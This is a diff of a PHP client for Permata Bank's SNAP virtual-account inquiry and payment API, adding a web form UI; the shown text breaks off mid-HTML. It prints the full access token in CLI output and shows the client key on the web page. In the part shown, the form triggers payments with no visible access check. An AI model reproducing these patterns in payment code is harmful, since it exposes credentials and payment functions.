-        $inquiryRequestId = snapExternalId();
-    }
+    if (empty($inquiryRequestId)) $inquiryRequestId = snapExternalId();
 
     // Ambil token otomatis
     $tokenResult = getToken();
     if (!$tokenResult['success']) {
         return [
-            'success'   => false,
-            'error'     => 'Token gagal: ' . $tokenResult['error'],
-            'http_code' => 0,
-            'raw'       => '',
-            'debug'     => [],
+            'success'           => false,
+            'error'             => 'Token gagal: ' . $tokenResult['error'],
+            'http_code'         => 0,
+            'raw'               => '',
+            'debug'             => [],
+            'access_token_used' => '',
+            'token_from_cache'  => false,
         ];
     }
-    $accessToken    = $tokenResult['access_token'];
-    $tokenFromCache = $tokenResult['from_cache'];
+    $accessToken   = $tokenResult['access_token'];
+    $fromCache     = $tokenResult['from_cache'];
 
-    // Eksekusi inquiry (dengan retry jika token expired)
     $result = _doInquiry($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo, $inquiryRequestId);
 
-    // Jika token expired (4012401), refresh token dan coba sekali lagi
-    $rc = $result['response_code'] ?? '';
-    if (in_array($rc, ['4012400', '4012401'], true)) {
-        $tokenResult    = getToken(true); // force refresh
+    // Auto-retry jika token expired
+    if (in_array($result['response_code'] ?? '', ['4012400', '4012401'], true)) {
+        $tokenResult = getToken(true);
         if ($tokenResult['success']) {
-            $accessToken    = $tokenResult['access_token'];
-            $tokenFromCache = false;
-            $result         = _doInquiry($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo, $inquiryRequestId);
+            $accessToken = $tokenResult['access_token'];
+            $fromCache   = false;
+            $result      = _doInquiry($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo, $inquiryRequestId);
         }
     }
 
-    $result['access_token_used']  = $accessToken;
-    $result['token_from_cache']   = $tokenFromCache;
+    $result['access_token_used'] = $accessToken;
+    $result['token_from_cache']  = $fromCache;
     return $result;
 }
 
-/**
- * Internal: eksekusi HTTP inquiry dengan token yang sudah ada
- */
+/** Internal: jalankan HTTP inquiry */
 function _doInquiry(
     string $accessToken,
     string $partnerServiceId,
@@ -649,42 +449,38 @@ function _doInquiry(
     string $virtualAccountNo,
     string $inquiryRequestId
 ): array {
-    if (empty($inquiryRequestId)) {
-        $inquiryRequestId = snapExternalId();
-    }
+    $externalId       = snapExternalId();
+    $timestamp        = snapTimestamp();
+    $snapPath         = SNAP_PATH_INQUIRY;
+    $url              = URL_INQUIRY;
+    $clientSecret     = getClientSecret();
 
-    $externalId = snapExternalId();
-    $timestamp  = snapTimestamp();
-    $snapPath   = '/v1.0/transfer-va/inquiry';
-    $url        = SNAP_BASE_URL . PATH_INQUIRY;
-
-    // partnerServiceId HARUS 8 karakter (pad kiri dengan spasi) - validasi di source
+    // partnerServiceId HARUS 8 karakter — divalidasi di cekAuthorizationTrx
     $partnerServiceId = str_pad($partnerServiceId, 8, ' ', STR_PAD_LEFT);
 
     $bodyArray = [
-        'partnerServiceId'  => $partnerServiceId,
-        'customerNo'        => $customerNo,
-        'virtualAccountNo'  => $virtualAccountNo,
-        'inquiryRequestId'  => $inquiryRequestId,
+        'partnerServiceId' => $partnerServiceId,
+        'customerNo'       => $customerNo,
+        'virtualAccountNo' => $virtualAccountNo,
+        'inquiryRequestId' => $inquiryRequestId,
     ];
     $jsonBody = json_encode($bodyArray, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
 
-    // Signature SNAP BI: HMAC-SHA512
-    $signature = genSnapSignature('POST', $snapPath, $accessToken, $jsonBody, $timestamp, SNAP_CLIENT_SECRET);
+    $signature = genSnapSignature('POST', $snapPath, $accessToken, $jsonBody, $timestamp, $clientSecret);
 
     $headers = [
         'Content-Type: application/json',
-        'Authorization: Bearer '  . $accessToken,
-        'X-TIMESTAMP: '           . $timestamp,
-        'X-SIGNATURE: '           . $signature,
-        'X-PARTNER-ID: '          . SNAP_PARTNER_ID,
-        'X-EXTERNAL-ID: '         . $externalId,
-        'CHANNEL-ID: '            . SNAP_CHANNEL_ID,
+        'Authorization: Bearer ' . $accessToken,
+        'X-TIMESTAMP: '          . $timestamp,
+        'X-SIGNATURE: '          . $signature,
+        'X-PARTNER-ID: '         . SNAP_PARTNER_ID,
+        'X-EXTERNAL-ID: '        . $externalId,
+        'CHANNEL-ID: '           . SNAP_CHANNEL_ID,
     ];
 
     $bodyHash = strtolower(hash('sha256', minifyJson($jsonBody)));
     $debug = [
-        'endpoint'     => $url,
+        'url'          => $url,
         'snap_path'    => $snapPath,
         'timestamp'    => $timestamp,
         'external_id'  => $externalId,
@@ -698,11 +494,13 @@ function _doInquiry(
 
     if ($result['error']) {
         return [
-            'success'   => false,
-            'error'     => 'cURL error: ' . $result['error'],
-            'http_code' => $result['http_code'],
-            'raw'       => '',
-            'debug'     => $debug,
+            'success'              => false,
+            'response_code'        => '',
+            'error'                => 'cURL error: ' . $result['error'],
+            'http_code'            => $result['http_code'],
+            'raw'                  => '',
+            'debug'                => $debug,
+            'virtual_account_data' => [],
         ];
     }
 
@@ -725,43 +523,10 @@ function _doInquiry(
 }
 
 /**
- * FUNGSI 3: VA Payment (SNAP BI) — Token otomatis
- * =================================================
- * Endpoint : POST /transfer-va/payment
- * SNAP Path: /v1.0/transfer-va/payment
- * Source   : mvc/payment/payment.controller.php
+ * vaPayment() — payment VA dengan token otomatis
  *
- * Token diambil OTOMATIS via getToken() — tidak perlu
- * generate/pass token secara manual.
- *
- * Flow:
- *  1. getToken() → ambil dari cache atau fetch baru
- *  2. Build body + hitung HMAC-SHA512 signature
- *  3. POST ke endpoint payment
- *  4. Jika response 4012501 (token expired) → retry sekali dengan token baru
- *
- * @param string $partnerServiceId BIN 8 karakter
- * @param string $customerNo       Nomor nasabah 12-16 digit
- * @param string $virtualAccountNo Nomor VA 12-16 digit
- * @param string $paymentRequestId ID unik payment (auto-generate jika kosong)
- * @param float  $paidAmount       Jumlah yang dibayar
- * @param float  $totalAmount      Total tagihan
- * @param string $currency         Mata uang (default: IDR)
- * @param string $trxDateTime      Waktu transaksi (default: sekarang)
- *
- * @return array [
- *   'success'              => bool,
- *   'response_code'        => string,   // '2002500' = sukses
- *   'response_message'     => string,
- *   'virtual_account_data' => array,
- *   'payment_flag_reason'  => array,
- *   'access_token_used'    => string,
- *   'token_from_cache'     => bool,
- *   'http_code'            => int,
- *   'raw'                  => string,
- *   'error'                => string,
- *   'debug'                => array,
- * ]
+ * Token diambil otomatis via getToken() (cache/fetch).
+ * Auto-retry sekali jika token expired (4012501).
  */
 function vaPayment(
     string $partnerServiceId,
@@ -777,40 +542,40 @@ function vaPayment(
     $tokenResult = getToken();
     if (!$tokenResult['success']) {
         return [
-            'success'   => false,
-            'error'     => 'Token gagal: ' . $tokenResult['error'],
-            'http_code' => 0,
-            'raw'       => '',
-            'debug'     => [],
+            'success'              => false,
+            'error'                => 'Token gagal: ' . $tokenResult['error'],
+            'http_code'            => 0,
+            'raw'                  => '',
+            'debug'                => [],
+            'access_token_used'    => '',
+            'token_from_cache'     => false,
+            'virtual_account_data' => [],
+            'payment_flag_reason'  => [],
         ];
     }
-    $accessToken    = $tokenResult['access_token'];
-    $tokenFromCache = $tokenResult['from_cache'];
+    $accessToken = $tokenResult['access_token'];
+    $fromCache   = $tokenResult['from_cache'];
 
-    // Eksekusi payment (dengan retry jika token expired)
     $result = _doPayment($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo,
                          $paymentRequestId, $paidAmount, $totalAmount, $currency, $trxDateTime);
 
-    // Jika token expired, refresh dan coba sekali lagi
-    $rc = $result['response_code'] ?? '';
-    if (in_array($rc, ['4012500', '4012501'], true)) {
+    // Auto-retry jika token expired
+    if (in_array($result['response_code'] ?? '', ['4012500', '4012501'], true)) {
         $tokenResult = getToken(true);
         if ($tokenResult['success']) {
-            $accessToken    = $tokenResult['access_token'];
-            $tokenFromCache = false;
-            $result         = _doPayment($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo,
-                                         $paymentRequestId, $paidAmount, $totalAmount, $currency, $trxDateTime);
+            $accessToken = $tokenResult['access_token'];
+            $fromCache   = false;
+            $result      = _doPayment($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo,
+                                      $paymentRequestId, $paidAmount, $totalAmount, $currency, $trxDateTime);
         }
     }
 
     $result['access_token_used'] = $accessToken;
-    $result['token_from_cache']  = $tokenFromCache;
+    $result['token_from_cache']  = $fromCache;
     return $result;
 }
 
-/**
- * Internal: eksekusi HTTP payment dengan token yang sudah ada
- */
+/** Internal: jalankan HTTP payment */
 function _doPayment(
     string $accessToken,
     string $partnerServiceId,
@@ -825,45 +590,40 @@ function _doPayment(
     if (empty($paymentRequestId)) $paymentRequestId = snapExternalId();
     if (empty($trxDateTime))      $trxDateTime      = snapTimestamp();
 
-    $externalId = snapExternalId();
-    $timestamp  = snapTimestamp();
-    $snapPath   = '/v1.0/transfer-va/payment';
-    $url        = SNAP_BASE_URL . PATH_PAYMENT;
+    $externalId       = snapExternalId();
+    $timestamp        = snapTimestamp();
+    $snapPath         = SNAP_PATH_PAYMENT;
+    $url              = URL_PAYMENT;
+    $clientSecret     = getClientSecret();
 
     $partnerServiceId = str_pad($partnerServiceId, 8, ' ', STR_PAD_LEFT);
 
     $bodyArray = [
-        'partnerServiceId'  => $partnerServiceId,
-        'customerNo'        => $customerNo,
-        'virtualAccountNo'  => $virtualAccountNo,
-        'paymentRequestId'  => $paymentRequestId,
-        'trxDateTime'       => $trxDateTime,
-        'paidAmount'        => [
-            'value'    => number_format($paidAmount, 2, '.', ''),
-            'currency' => $currency,
-        ],
-        'totalAmount'       => [
-            'value'    => number_format($totalAmount, 2, '.', ''),
-            'currency' => $currency,
-        ],
+        'partnerServiceId' => $partnerServiceId,
+        'customerNo'       => $customerNo,
+        'virtualAccountNo' => $virtualAccountNo,
+        'paymentRequestId' => $paymentRequestId,
+        'trxDateTime'      => $trxDateTime,
+        'paidAmount'       => ['value' => number_format($paidAmount, 2, '.', ''), 'currency' => $currency],
+        'totalAmount'      => ['value' => number_format($totalAmount, 2, '.', ''), 'currency' => $currency],
     ];
     $jsonBody = json_encode($bodyArray, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
 
-    $signature = genSnapSignature('POST', $snapPath, $accessToken, $jsonBody, $timestamp, SNAP_CLIENT_SECRET);
+    $signature = genSnapSignature('POST', $snapPath, $accessToken, $jsonBody, $timestamp, $clientSecret);
 
     $headers = [
         'Content-Type: application/json',
-        'Authorization: Bearer '  . $accessToken,
-        'X-TIMESTAMP: '           . $timestamp,
-        'X-SIGNATURE: '           . $signature,
-        'X-PARTNER-ID: '          . SNAP_PARTNER_ID,
-        'X-EXTERNAL-ID: '         . $externalId,
-        'CHANNEL-ID: '            . SNAP_CHANNEL_ID,
+        'Authorization: Bearer ' . $accessToken,
+        'X-TIMESTAMP: '          . $timestamp,
+        'X-SIGNATURE: '          . $signature,
+        'X-PARTNER-ID: '         . SNAP_PARTNER_ID,
+        'X-EXTERNAL-ID: '        . $externalId,
+        'CHANNEL-ID: '           . SNAP_CHANNEL_ID,
     ];
 
     $bodyHash = strtolower(hash('sha256', minifyJson($jsonBody)));
     $debug = [
-        'endpoint'     => $url,
+        'url'          => $url,
         'snap_path'    => $snapPath,
         'timestamp'    => $timestamp,
         'external_id'  => $externalId,
@@ -877,11 +637,14 @@ function _doPayment(
 
     if ($result['error']) {
         return [
-            'success'   => false,
-            'error'     => 'cURL error: ' . $result['error'],
-            'http_code' => $result['http_code'],
-            'raw'       => '',
-            'debug'     => $debug,
+            'success'              => false,
+            'response_code'        => '',
+            'error'                => 'cURL error: ' . $result['error'],
+            'http_code'            => $result['http_code'],
+            'raw'                  => '',
+            'debug'                => $debug,
+            'virtual_account_data' => [],
+            'payment_flag_reason'  => [],
         ];
     }
 
@@ -902,241 +665,486 @@ function _doPayment(
         'debug'                => $debug,
     ];
 }
-// ---- end _doPayment()
 
 // ==============================================================
-// ======== TABEL RESPONSE CODE SNAP BI (dari source code) ======
-// ==============================================================
-//
-//  TOKEN (/b2b/token):
-//    2007300  = Successful
-//    400XX01  = Invalid field format {field}
-//    400XX02  = Missing mandatory field {field}
-//    401XX00  = Unauthorized signature (x-client-key tidak ditemukan)
-//
-//  INQUIRY (/inquiry):
-//    2002400  = Successful
-//    4002400  = Bad request
-//    4002401  = Invalid field format {field}
-//    4002402  = Missing mandatory field {field}
-//    4012400  = Unauthorized (header tidak valid / missing)
-//    4012401  = Access token invalid atau expired
-//    4042415  = Transaction Not Permitted (invalid req/response)
-//    4092400  = Conflict (x-external-id duplikat)
-//
-//  PAYMENT (/payment):
-//    2002500  = Successful
-//    4002500  = Bad request
-//    4002501  = Invalid field format {field}
-//    4002502  = Missing mandatory field {field}
-//    4012500  = Unauthorized (header tidak valid / missing)
-//    4012501  = Access token invalid atau expired
-//    4042515  = Transaction Not Permitted
-//    4092500  = Conflict (x-external-id duplikat)
-
-// ==============================================================
-// =================== OUTPUT HELPER ===========================
+// ========================= WEB UI =============================
 // ==============================================================
 
-function printSection(string $title): void
-{
-    $line = str_repeat('=', 62);
-    echo "\n$line\n $title\n$line\n";
-}
+$isCli = (PHP_SAPI === 'cli');
 
-function printResult(array $result, bool $showDebug = false): void
-{
-    $icon = ($result['success'] ?? false) ? 'OK' : 'FAIL';
-    echo "[$icon] HTTP " . ($result['http_code'] ?? '-') . "\n";
+if ($isCli) {
+    // ---- CLI mode ----
+    $action    = $argv[1] ?? 'demo';
+    $showDebug = in_array('--debug', $argv);
 
-    if (!empty($result['error'])) {
-        echo "  Error  : " . $result['error'] . "\n";
-    }
+    $binArg    = $argv[2] ?? SNAP_BIN;
+    $custArg   = $argv[3] ?? '000000000001';
+    $vaArg     = $argv[4] ?? (SNAP_BIN . '000000000001');
+    $paidArg   = (float)($argv[5] ?? 100000);
+    $totalArg  = (float)($argv[6] ?? 100000);
 
-    $skip = ['raw', 'debug', 'error', 'success', 'http_code'];
-    foreach ($result as $k => $v) {
-        if (in_array($k, $skip, true)) continue;
-        if (is_array($v) && !empty($v)) {
-            echo "  $k:\n";
-            echo "    " . json_encode($v, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
-        } elseif (!is_array($v) && $v !== '') {
-            echo "  $k: $v\n";
-        }
-    }
+    echo "================================================================\n";
+    echo " Permata Bank SNAP API\n";
+    echo " Waktu   : " . date('Y-m-d H:i:s') . "\n";
+    echo " Server  : " . SNAP_BASE_URL . "\n";
+    echo " Profil  : " . $_ACTIVE_PROFILE . " (" . SNAP_SUPPLIER_NAME . ")\n";
+    echo " Partner : " . SNAP_PARTNER_ID . "\n";
+    echo "================================================================\n";
 
-    if ($showDebug && !empty($result['debug'])) {
-        echo "\n  -- DEBUG --\n";
-        foreach ($result['debug'] as $k => $v) {
-            echo "  $k: $v\n";
-        }
-    }
-
-    if (!empty($result['raw'])) {
-        echo "\n  -- RAW RESPONSE --\n";
-        $pretty = json_decode($result['raw'], true);
-        echo ($pretty !== null)
-            ? json_encode($pretty, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n"
-            : $result['raw'] . "\n";
-    }
-}
-
-// ==============================================================
-// ======================== MAIN ================================
-// ==============================================================
-
-$isCli     = (PHP_SAPI === 'cli');
-$action    = $isCli ? ($argv[1] ?? 'demo') : ($_GET['action'] ?? 'demo');
-$showDebug = $isCli
-    ? in_array('--debug', $argv ?? [])
-    : isset($_GET['debug']);
-
-if (!$isCli) {
-    header('Content-Type: text/plain; charset=utf-8');
-}
-
-echo "================================================================\n";
-echo " Permata Bank SNAP API (permata-switching_v1.0_pro)\n";
-echo " Waktu  : " . date('Y-m-d H:i:s') . "\n";
-echo " Server  : " . SNAP_BASE_URL . "\n";
-echo " Profil  : " . $_ACTIVE_PROFILE . " (" . SNAP_SUPPLIER_NAME . ")\n";
-echo " Partner : " . SNAP_PARTNER_ID . "\n";
-echo " ClientKey: " . SNAP_CLIENT_KEY . "\n";
-echo "================================================================\n";
-
-switch ($action) {
-
-    // ---- Token saja ------------------------------------------
-    case 'token':
-        printSection('Generate Token B2B (raw)');
-        printResult(generateToken(), $showDebug);
-        break;
-
-    // ---- Inquiry — token otomatis ----------------------------
-    case 'inquiry':
-        $bin    = $isCli ? ($argv[2] ?? SNAP_BIN)                : ($_GET['bin']         ?? SNAP_BIN);
-        $custNo = $isCli ? ($argv[3] ?? '000000001')              : ($_GET['customer_no'] ?? '000000001');
-        $vaNo   = $isCli ? ($argv[4] ?? SNAP_BIN.'001060001361')  : ($_GET['va_no']       ?? SNAP_BIN.'001060001361');
-
-        printSection("VA Inquiry (token otomatis)  VA: $vaNo");
-        $inq = vaInquiry($bin, $custNo, $vaNo);
-        if ($showDebug) {
-            echo "  [token] " . ($inq['token_from_cache'] ? 'dari cache' : 'baru') .
-                 " | " . substr($inq['access_token_used'] ?? '', 0, 16) . "...\n";
-        }
-        printResult($inq, $showDebug);
-        break;
-
-    // ---- Payment — token otomatis ----------------------------
-    case 'payment':
-        $bin      = $isCli ? ($argv[2] ?? SNAP_BIN)                : ($_GET['bin']          ?? SNAP_BIN);
-        $custNo   = $isCli ? ($argv[3] ?? '000000001')              : ($_GET['customer_no']  ?? '000000001');
-        $vaNo     = $isCli ? ($argv[4] ?? SNAP_BIN.'001060001361')  : ($_GET['va_no']        ?? SNAP_BIN.'001060001361');
-        $paidAmt  = (float)($isCli ? ($argv[5] ?? '100000')        : ($_GET['paid_amount']  ?? '100000'));
-        $totalAmt = (float)($isCli ? ($argv[6] ?? '100000')        : ($_GET['total_amount'] ?? '100000'));
-
-        printSection("VA Payment (token otomatis)  VA: $vaNo  IDR " . number_format($paidAmt));
-        $pay = vaPayment($bin, $custNo, $vaNo, '', $paidAmt, $totalAmt);
-        if ($showDebug) {
-            echo "  [token] " . ($pay['token_from_cache'] ? 'dari cache' : 'baru') .
-                 " | " . substr($pay['access_token_used'] ?? '', 0, 16) . "...\n";
-        }
-        printResult($pay, $showDebug);
-        break;
-
-    // ---- Inquiry + Payment sekaligus (token 1x) --------------
-    case 'inquiry_payment':
-        $bin      = $isCli ? ($argv[2] ?? SNAP_BIN)                : ($_GET['bin']          ?? SNAP_BIN);
-        $custNo   = $isCli ? ($argv[3] ?? '000000001')              : ($_GET['customer_no']  ?? '000000001');
-        $vaNo     = $isCli ? ($argv[4] ?? SNAP_BIN.'001060001361')  : ($_GET['va_no']        ?? SNAP_BIN.'001060001361');
-        $paidAmt  = (float)($isCli ? ($argv[5] ?? '100000')        : ($_GET['paid_amount']  ?? '100000'));
-        $totalAmt = (float)($isCli ? ($argv[6] ?? '100000')        : ($_GET['total_amount'] ?? '100000'));
-
-        // Token di-fetch sekali, dipakai untuk inquiry DAN payment via cache
-        printSection("Step 1 - VA Inquiry (auto token)  VA: $vaNo");
-        $inq = vaInquiry($bin, $custNo, $vaNo);
-        echo "  [token] " . ($inq['token_from_cache'] ? 'dari cache' : 'baru fetch') . "\n";
-        printResult($inq, $showDebug);
-
-        if (!$inq['success']) {
-            echo "\nInquiry gagal. Payment dibatalkan.\n";
+    switch ($action) {
+        case 'token':
+            echo "\n[Token]\n";
+            $tok = generateToken();
+            echo " HTTP     : " . $tok['http_code'] . "\n";
+            echo " Success  : " . ($tok['success'] ? 'Ya' : 'Tidak') . "\n";
+            if ($tok['success']) echo " Token    : " . $tok['access_token'] . "\n";
+            else                 echo " Error    : " . $tok['error'] . "\n";
+            echo " Raw      : " . $tok['raw'] . "\n";
+            if ($showDebug) { echo "\n[DEBUG]\n"; print_r($tok['debug']); }
             break;
-        }
 
-        // Token sudah di cache — payment pakai token yang sama
-        printSection("Step 2 - VA Payment (token dari cache)  IDR " . number_format($paidAmt));
-        $pay = vaPayment($bin, $custNo, $vaNo, '', $paidAmt, $totalAmt);
-        echo "  [token] " . ($pay['token_from_cache'] ? 'dari cache ✓' : 'baru fetch') . "\n";
-        printResult($pay, $showDebug);
-        break;
+        case 'inquiry':
+            $inq = vaInquiry($binArg, $custArg, $vaArg);
+            echo "\n[Inquiry] VA: $vaArg\n";
+            echo " HTTP     : " . $inq['http_code'] . "\n";
+            echo " Success  : " . ($inq['success'] ? 'Ya' : 'Tidak') . "\n";
+            echo " RC       : " . ($inq['response_code'] ?? '') . "\n";
+            echo " Token    : " . (($inq['token_from_cache'] ?? false) ? 'cache' : 'baru') . "\n";
+            if (!$inq['success']) echo " Error    : " . $inq['error'] . "\n";
+            echo " Raw      : " . $inq['raw'] . "\n";
+            if ($showDebug) { echo "\n[DEBUG]\n"; print_r($inq['debug']); }
+            break;
 
-    // ---- Full demo -------------------------------------------
-    case 'demo':
-    default:
-        echo "\nMode DEMO — Token diambil otomatis, tidak perlu diisi manual.\n";
+        case 'payment':
+            $pay = vaPayment($binArg, $custArg, $vaArg, '', $paidArg, $totalArg);
+            echo "\n[Payment] VA: $vaArg  IDR " . number_format($paidArg) . "\n";
+            echo " HTTP     : " . $pay['http_code'] . "\n";
+            echo " Success  : " . ($pay['success'] ? 'Ya' : 'Tidak') . "\n";
+            echo " RC       : " . ($pay['response_code'] ?? '') . "\n";
+            echo " Token    : " . (($pay['token_from_cache'] ?? false) ? 'cache' : 'baru') . "\n";
+            if (!$pay['success']) echo " Error    : " . $pay['error'] . "\n";
+            echo " Raw      : " . $pay['raw'] . "\n";
+            if ($showDebug) { echo "\n[DEBUG]\n"; print_r($pay['debug']); }
+            break;
 
-        $bin  = SNAP_BIN;
-        $vaNo = $bin . '001060001361';
-        echo " BIN: $bin | VA: $vaNo\n";
+        default: // demo
+            echo "\n[Demo] Inquiry + Payment\n";
+            $vaNo = SNAP_BIN . '000000000001';
 
-        // Inquiry — token di-fetch otomatis, disimpan cache
-        printSection("Step 1 - VA Inquiry (auto token)  VA: $vaNo");
-        $inq = vaInquiry($bin, '000000001', $vaNo);
-        echo "  [token] " . ($inq['token_from_cache'] ? 'dari cache' : 'baru fetch') .
-             " | " . substr($inq['access_token_used'] ?? '', 0, 16) . "...\n";
-        printResult($inq, $showDebug);
+            $inq = vaInquiry(SNAP_BIN, '000000000001', $vaNo);
+            echo "\n--- Inquiry ---\n";
+            echo " HTTP    : " . $inq['http_code'] . "\n";
+            echo " RC      : " . ($inq['response_code'] ?? '') . "\n";
+            echo " Token   : " . (($inq['token_from_cache'] ?? false) ? 'cache' : 'baru') . "\n";
+            echo " Raw     : " . $inq['raw'] . "\n";
 
-        // Payment — token sudah ada di cache, tidak fetch ulang
-        printSection("Step 2 - VA Payment (token cache)  VA: $vaNo  IDR 100.000");
-        $pay = vaPayment($bin, '000000001', $vaNo, '', 100000, 100000);
-        echo "  [token] " . ($pay['token_from_cache'] ? 'dari cache ✓' : 'baru fetch') .
-             " | " . substr($pay['access_token_used'] ?? '', 0, 16) . "...\n";
-        printResult($pay, $showDebug);
-
-        break;
+            $pay = vaPayment(SNAP_BIN, '000000000001', $vaNo, '', 100000, 100000);
+            echo "\n--- Payment ---\n";
+            echo " HTTP    : " . $pay['http_code'] . "\n";
+            echo " RC      : " . ($pay['response_code'] ?? '') . "\n";
+            echo " Token   : " . (($pay['token_from_cache'] ?? false) ? 'cache ✓' : 'baru') . "\n";
+            echo " Raw     : " . $pay['raw'] . "\n";
+    }
+    echo "\n================================================================\n";
+    exit;
 }
 
-echo "\n================================================================\n";
-echo " Selesai - " . date('Y-m-d H:i:s') . "\n";
-echo "================================================================\n";
+// ==============================================================
+// ========================= WEB UI HTML ========================
+// ==============================================================
 
-/*
- * ================================================================
- * CARA INTEGRASI DARI KODE LAIN
- * ================================================================
- *
- *   require_once 'permatabank_api_real.php';
- *
- *   // Inquiry VA — token diambil OTOMATIS, tidak perlu generate manual
- *   $inq = vaInquiry('7406', '081234567890', '7406001060001361');
- *   if ($inq['success']) {
- *       $va = $inq['virtual_account_data'];
- *       echo "Nama    : " . ($va['name'] ?? '-') . "\n";
- *       echo "Nominal : " . ($va['totalAmount']['value'] ?? '-') . "\n";
- *   } else {
- *       echo "Inquiry gagal: " . $inq['error'] . "\n";
- *   }
- *
- *   // Payment VA — token sudah di cache dari inquiry di atas (1x fetch)
- *   $pay = vaPayment('7406', '081234567890', '7406001060001361',
- *                    '', 150000, 150000, 'IDR');
- *   if ($pay['success']) echo "Pembayaran berhasil!\n";
- *
- * ================================================================
- * CLI COMMANDS:
- * ================================================================
- *   php permatabank_api_real.php demo
- *   php permatabank_api_real.php demo --debug
- *   php permatabank_api_real.php token                              # raw token saja
- *   php permatabank_api_real.php inquiry 7406 081234567890 7406001060001361
- *   php permatabank_api_real.php payment 7406 081234567890 7406001060001361 150000 150000
- *   php permatabank_api_real.php inquiry_payment 7406 081234567890 7406001060001361 150000 150000
- *
- * HTTP QUERY:
- *   ?action=demo
- *   ?action=token
- *   ?action=inquiry&bin=7406&customer_no=081234567890&va_no=7406001060001361
- *   ?action=payment&bin=7406&va_no=7406001060001361&paid_amount=150000&total_amount=150000
- *   ?action=inquiry_payment&bin=7406&customer_no=081234567890&va_no=7406001060001361&paid_amount=150000&total_amount=150000
- *   ?action=demo&debug=1
- * ================================================================
- */
+// Tangkap output jika ada POST/GET action
+$uiResult  = null;
+$uiAction  = $_REQUEST['action'] ?? '';
+$uiError   = '';
+
+if ($uiAction === 'token') {
+    $uiResult = generateToken();
+
+} elseif ($uiAction === 'inquiry') {
+    $bin   = trim($_POST['bin']    ?? SNAP_BIN);
+    $cust  = trim($_POST['cust']   ?? '');
+    $vaNo  = trim($_POST['vano']   ?? '');
+    $reqId = trim($_POST['reqid']  ?? '');
+    if (empty($cust) || empty($vaNo)) {
+        $uiError = 'customerNo dan virtualAccountNo wajib diisi.';
+    } else {
+        $uiResult = vaInquiry($bin, $cust, $vaNo, $reqId);
+    }
+
+} elseif ($uiAction === 'payment') {
+    $bin   = trim($_POST['bin']       ?? SNAP_BIN);
+    $cust  = trim($_POST['cust']      ?? '');
+    $vaNo  = trim($_POST['vano']      ?? '');
+    $paid  = (float)($_POST['paid']   ?? 0);
+    $total = (float)($_POST['total']  ?? 0);
+    $curr  = trim($_POST['currency']  ?? 'IDR');
+    $reqId = trim($_POST['reqid']     ?? '');
+    if (empty($cust) || empty($vaNo) || $paid <= 0) {
+        $uiError = 'customerNo, virtualAccountNo, dan paidAmount wajib diisi.';
+    } else {
+        $uiResult = vaPayment($bin, $cust, $vaNo, $reqId, $paid, $total ?: $paid, $curr);
+    }
+}
+
+// Helper render JSON
+function prettyJson(?string $raw): string {
+    if (empty($raw)) return '<em class="text-gray-400">—</em>';
+    $dec = json_decode($raw, true);
+    if ($dec === null) return htmlspecialchars($raw);
+    return '<pre class="text-xs leading-relaxed">' . htmlspecialchars(json_encode($dec, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . '</pre>';
+}
+function badge(bool $ok): string {
+    return $ok
+        ? '<span class="px-2 py-0.5 rounded-full bg-green-100 text-green-700 text-xs font-bold">✓ SUKSES</span>'
+        : '<span class="px-2 py-0.5 rounded-full bg-red-100 text-red-700 text-xs font-bold">✗ GAGAL</span>';
+}
+function rcBadge(string $rc): string {
+    $color = str_starts_with($rc, '2') ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
+    return $rc ? "<span class=\"px-2 py-0.5 rounded $color text-xs font-mono font-bold\">$rc</span>" : '—';
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Permata SNAP API — <?= htmlspecialchars(SNAP_SUPPLIER_NAME) ?></title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
+<style>
+  body { background: #f0f4f8; font-family: 'Segoe UI', system-ui, sans-serif; }
+  .card { background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
+  .tab-btn { transition: all .2s; }
+  .tab-btn.active { background: #1d4ed8; color: #fff; }
+  .tab-btn:not(.active):hover { background: #dbeafe; }
+  .result-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; }
+  pre { white-space: pre-wrap; word-break: break-all; }
+  input, select { transition: border-color .2s; }
+  input:focus, select:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,.15); }
+</style>
+</head>
+<body class="min-h-screen py-8 px-4">
+
+<!-- Header -->
+<div class="max-w-3xl mx-auto mb-6">
+  <div class="card p-5 flex items-center justify-between">
+    <div>
+      <div class="flex items-center gap-2 mb-1">
+        <i class="fas fa-university text-blue-600 text-xl"></i>
+        <h1 class="text-xl font-bold text-gray-800">Permata Bank SNAP API</h1>
+      </div>
+      <div class="text-sm text-gray-500 space-y-0.5">
+        <div><span class="font-medium text-gray-600">Profil:</span> <?= htmlspecialchars($_ACTIVE_PROFILE) ?> — <?= htmlspecialchars(SNAP_SUPPLIER_NAME) ?></div>
+        <div><span class="font-medium text-gray-600">Partner ID:</span> <?= htmlspecialchars(SNAP_PARTNER_ID) ?></div>
+        <div><span class="font-medium text-gray-600">Server:</span> <code class="bg-gray-100 px-1 rounded text-xs"><?= htmlspecialchars(SNAP_BASE_URL) ?></code></div>
+        <div><span class="font-medium text-gray-600">BIN VA:</span> <?= htmlspecialchars(SNAP_BIN) ?></div>
+      </div>
+    </div>
+    <div class="text-right text-xs text-gray-400">
+      <div><i class="fas fa-clock mr-1"></i><?= date('Y-m-d H:i:s') ?></div>
+      <div class="mt-1">
+        <span class="px-2 py-0.5 bg-blue-50 text-blue-600 rounded font-mono text-xs"><?= htmlspecialchars(SNAP_CLIENT_KEY) ?></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Tab Nav -->
+<div class="max-w-3xl mx-auto mb-4">
+  <div class="flex gap-2">
